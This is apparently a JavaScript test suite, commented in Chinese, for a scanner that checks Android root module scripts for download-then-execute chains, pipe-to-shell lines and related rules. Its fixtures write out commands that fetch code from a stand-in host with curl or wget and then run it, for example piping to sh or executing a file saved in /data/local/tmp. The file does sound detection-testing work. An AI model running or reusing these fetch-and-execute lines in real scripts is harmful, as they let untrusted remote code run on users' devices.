    'cp -f busybox $MODPATH/system/xbin/bb',
    'rm -rf $MODDIR/cache'));
  assert.deepEqual(t3set(r), [], '哨兵的精确集合是空集：T3 不许给正经模块新增任何发现');
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve');
});

// —— 共存与去重（工单 §2 的验收判据）——

test('T3 共存：落盘进 $MODPATH 再执行时 DOWNLOAD_THEN_EXEC 与 EXEC_BUNDLED_FILE 都要出（两个事实）', async () => {
  const r = await t3scan('eval.t3n', t3body(T3_SHEBANG,
    'curl -s https://x.dev/run -o $MODPATH/run.bin',
    'chmod 755 $MODPATH/run.bin',
    '$MODPATH/run.bin'));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), ['service.sh:4/high'], '远程内容落盘后执行');
  assert.deepEqual(t3spots(r, 'EXEC_BUNDLED_FILE'), ['service.sh:4/high'], '包内引用被执行（既有那条不许被摘掉）');
  assert.deepEqual(t3set(r), ['DOWNLOAD_THEN_EXEC/high', 'EXEC_BUNDLED_FILE/high', 'NETWORK_FETCH/low']);
  assert.equal(r.counts.high, 2, '两条 high 各说一件事：这里不许互相吞，也不许叠成三条');
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

test('T3 去重：PIPE_TO_SHELL 与 DOWNLOAD_THEN_EXEC 不叠成两条 high（管道行本身不算执行形态）', async () => {
  const r = await t3scan('eval.t3o', t3body(T3_SHEBANG, 'curl -s https://x.dev/a | sh'));
  const both = r.findings.filter((f) => /PIPE_TO_SHELL|DOWNLOAD_THEN_EXEC/.test(f.ruleId));
  assert.equal(both.length, 1, JSON.stringify(t3set(r)));
  assert.deepEqual(t3spots(r, 'DOWNLOAD_THEN_EXEC'), [], '管道写法没有落盘 sink，本规则在该行不出');
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
  assert.equal(r.riskLevel, 'high');
});

test('T3 去重（文本层硬约束）：执行行同时是 PIPE_TO_SHELL 的命中行时，本规则在那一行让位', () => {
  // 工单 §2：管道那一行本身不算执行形态（`curl … | sh` 没有 sink），两条天然不叠。
  // 这里钉的是那条**硬约束**：一行里既有管道写法、又把已落盘的路径顶在命令位时，只许 PIPE_TO_SHELL 说话。
  const t = t3body(T3_SHEBANG,
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'curl -s https://x.dev/v | sh; /data/local/tmp/u');
  assert.deepEqual(hits('PIPE_TO_SHELL', t).map((f) => f.line), [3], '夹具必须真的把管道命中造在执行行上');
  assert.deepEqual(t3hits(t), [], '该行是 PIPE_TO_SHELL 的命中行 ⇒ 本规则不出');
  // 同一形状去掉管道写法后必须由本规则说话：证明上面那个 0 是「让位」，不是「没看见这条链」
  assert.deepEqual(t3hits(t3body(T3_SHEBANG,
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'true; /data/local/tmp/u')), ['3/high']);
});

// —— 写法面（工单 §2 的负面清单逐条）——

test('T3 写法面：-o/--output/-O/-P/--directory-prefix/>/>> 立 sink；-o- / -O - / --output - / 2> / 无 basename 的 -P 都不立', () => {
  const chain = (dl, ex) => t3body(T3_SHEBANG, dl, ex);
  // 立 sink 的写法：落地行 2、执行行 3 ⇒ 1 条
  for (const dl of [
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'curl -s --output /data/local/tmp/u https://x.dev/u',
    'curl -s https://x.dev/u --output=/data/local/tmp/u',
    'wget -q -O /data/local/tmp/u https://x.dev/u',
    'wget -q -O=/data/local/tmp/u https://x.dev/u',
    'curl -s https://x.dev/u > /data/local/tmp/u',
    'curl -s https://x.dev/u >> /data/local/tmp/u',
  ]) {
    assert.deepEqual(t3hits(chain(dl, 'sh /data/local/tmp/u')), ['3/high'], `应当立 sink：${dl}`);
  }
  for (const [dl, ex] of [
    ['wget -q -P /data/local/tmp https://x.dev/u', 'sh /data/local/tmp/u'],
    ['wget -q --directory-prefix /data/local/tmp https://x.dev/u', 'sh /data/local/tmp/u'],
    ['wget -q -P /data/local/tmp/ https://x.dev/u', 'sh /data/local/tmp/u'],
    ['wget -q -P "/data/local/tmp" "https://x.dev/a/b"', 'sh /data/local/tmp/b'],
  ]) {
    assert.deepEqual(t3hits(chain(dl, ex)), ['3/high'], `-P 的落地路径 = 目录去尾斜杠 + URL basename：${dl}`);
  }
  // 不立 sink 的写法：标准输出、带 fd 的重定向、URL 末段没有 basename
  for (const dl of [
    'curl -o- https://x.dev/u',
    'curl -s -o - https://x.dev/u',
    'curl -s --output - https://x.dev/u',
    'wget -q -O- https://x.dev/u',
    'wget -q -O - https://x.dev/u',
    'curl -s https://x.dev/u 2>/data/local/tmp/u',
  ]) {
    assert.deepEqual(t3hits(chain(dl, 'sh /data/local/tmp/u')), [], `标准输出/带 fd 的重定向不是落盘：${dl}`);
  }
  for (const dl of [
    'wget -q -P /data/local/tmp https://x.dev/',
    'wget -q -P /data/local/tmp https://x.dev',
  ]) {
    assert.deepEqual(t3hits(chain(dl, 'sh /data/local/tmp/payload')), [], `URL 末段没有 basename 时不许猜 sink：${dl}`);
  }
});

test('T3 执行形态：firstToken 是路径本身、或 sh/bash/ash/source/. 的参数；裸 chmod 与 exec/解释器表外的动词都不算执行', () => {
  const dl = 'curl -s https://x.dev/u -o /data/local/tmp/u';
  for (const ex of [
    '/data/local/tmp/u',
    'sh /data/local/tmp/u',
    'bash -x /data/local/tmp/u',
    'ash /data/local/tmp/u',
    '. /data/local/tmp/u',
    'source /data/local/tmp/u',
    'x=1; /data/local/tmp/u',
    'true && /data/local/tmp/u',
  ]) {
    assert.deepEqual(t3hits(t3body(T3_SHEBANG, dl, ex)), ['3/high'], `执行形态应当说话：${ex}`);
  }
  for (const ex of [
    'chmod 700 /data/local/tmp/u',
    'chown 0:0 /data/local/tmp/u',
    'exec /data/local/tmp/u',
    'nohup /data/local/tmp/u &',
    'busybox sh /data/local/tmp/u',
    'ls -l /data/local/tmp/u',
    'ui_print "/data/local/tmp/u"',
    'echo /data/local/tmp/u',
  ]) {
    assert.deepEqual(t3hits(t3body(T3_SHEBANG, dl, ex)), [], `不是本规则承诺的执行形态：${ex}`);
  }
});

test('T3 纯文本判据：注释行里的链不报；跨文件不报（写进已知限度，不许声称覆盖）', () => {
  // 注释里写完一整条链再执行别的东西：注释行不许立 sink，也不许立执行形态
  assert.deepEqual(t3hits(t3body(T3_SHEBANG,
    '# curl -s https://x.dev/u -o /data/local/tmp/u',
    '# /data/local/tmp/u',
    'ui_print ok')), []);
  // 同一篇文本里 sink 与执行分开写在两个文件里 —— 规则只吃单文件文本，跨文件不在能力内
  const one = hits('DOWNLOAD_THEN_EXEC', t3body(T3_SHEBANG, 'curl -s https://x.dev/u -o /data/local/tmp/u'), 'install.sh');
  const other = hits('DOWNLOAD_THEN_EXEC', t3body(T3_SHEBANG, 'sh /data/local/tmp/u'), 'service.sh');
  assert.deepEqual(one.map((f) => f.line), [], 'install.sh 只下载：没有执行行');
  assert.deepEqual(other.map((f) => f.line), [], 'service.sh 只执行：本规则看不到 install.sh 的 sink');
});

test('T3 上限：maxPerFile 与工厂一致（每文件每规则 ≤20 条，按链计），且不按执行形态数放大', () => {
  const lines = [T3_SHEBANG];
  for (let i = 1; i <= 25; i++) {
    lines.push(`curl -s https://x.dev/f${i} -o /data/local/tmp/f${i}`);
    lines.push(`/data/local/tmp/f${i}`);
  }
  const found = hits('DOWNLOAD_THEN_EXEC', lines.join('\n') + '\n');
  assert.equal(found.length, 20, `按链收敛的上限必须是 20，实际 ${found.length}`);
  assert.deepEqual([...new Set(found.map((f) => f.line))].length, 20, '每条是不同的链，不是同一条重复');
});

test('T3 规则自身形状：手写但对外与工厂同形；pattern 是 null（redactText 的 !r.pattern 分支），category 复用 execution', () => {
  const rule = RULES_BY_ID.DOWNLOAD_THEN_EXEC;
  assert.ok(rule, 'DOWNLOAD_THEN_EXEC 必须进 RULES_BY_ID');
  assert.ok(CONTENT_RULES.includes(rule), '不进 CONTENT_RULES 的话 scanContent 根本不会跑它');
  assert.equal(rule.severity, 'high');
  assert.equal(rule.category, 'execution', '不许新造 category（T2 的 policy 桶教训：新桶忘了渲染等于没说过话）');
  assert.equal(rule.anchor, 'anywhere', '跨行规则也要声明锚点，闭包表逐条验');
  assert.equal(rule.pattern, null, '匹配不住在单个正则上：null 是有意为之，redactText 走 if (!r.pattern) continue');
  assert.ok(rule.title && rule.advice, '报告的两个字段都得有');
  assert.equal(CATEGORY_LABEL.execution, '载荷间接执行');
  // snippet 用模块里已有的 trimSnippet：空白压平、超长截尾
  const h = rule.scan('service.sh', t3body(T3_SHEBANG,
    'curl -s   https://x.dev/u -o /data/local/tmp/u',
    'chmod   700 /data/local/tmp/u',
    '/data/local/tmp/u'));
  assert.equal(h.length, 1, JSON.stringify(h));
  assert.equal(h[0].snippet, h[0].snippet.trim());
  assert.ok(!/\s\s/.test(h[0].snippet), `snippet 必须由 trimSnippet 压平：${JSON.stringify(h[0].snippet)}`);
  assert.match(h[0].snippet, /\/data\/local\/tmp\/u/);
  // Finding 形状与工厂逐字段对齐（消息取 title、行号取执行行）
  assert.deepEqual(Object.keys(h[0]).sort(),
    ['advice', 'category', 'file', 'line', 'message', 'ruleId', 'severity', 'snippet'].sort());
  assert.equal(h[0].message, rule.title);
  assert.equal(h[0].line, 4);
  // 纯函数：同输入两次逐字节一致（规则表完整性断言用的是 rm 夹具，这里补跨行链的形态）
  assert.equal(JSON.stringify(rule.scan('x.sh', h[0].snippet)), JSON.stringify(rule.scan('x.sh', h[0].snippet)));
  // 脱敏通道不许因为 pattern:null 崩掉（本规则不是 privacy 类，压根不进 REDACT_RULES）
  assert.equal(typeof redactText(t3body(T3_SHEBANG, 'curl -s https://x.dev/u -o /data/local/tmp/u')), 'string');
});

test('T3 变异防线：链的证据必须同时含落地行与执行行（snippet 里两行都在，缺一行就是报告在说谎）', () => {
  const t = t3body(T3_SHEBANG,
    'curl -s https://x.dev/u -o /data/local/tmp/u',
    'chmod 700 /data/local/tmp/u',
    '/data/local/tmp/u');
  const [f] = hits('DOWNLOAD_THEN_EXEC', t, 'service.sh');
  assert.ok(f, '夹具必须命中，否则下面的断言是空转');
  assert.match(f.snippet, /curl -s https:\/\/x\.dev\/u -o \/data\/local\/tmp\/u/, '落地行的证据要在');
  assert.match(f.snippet, /chmod 700 \/data\/local\/tmp\/u/, 'chmod 作为同一条链的证据进 snippet');
  assert.match(f.snippet, /-> \/data\/local\/tmp\/u/, '执行行的证据要在');
  assert.equal(f.file, 'service.sh');
});
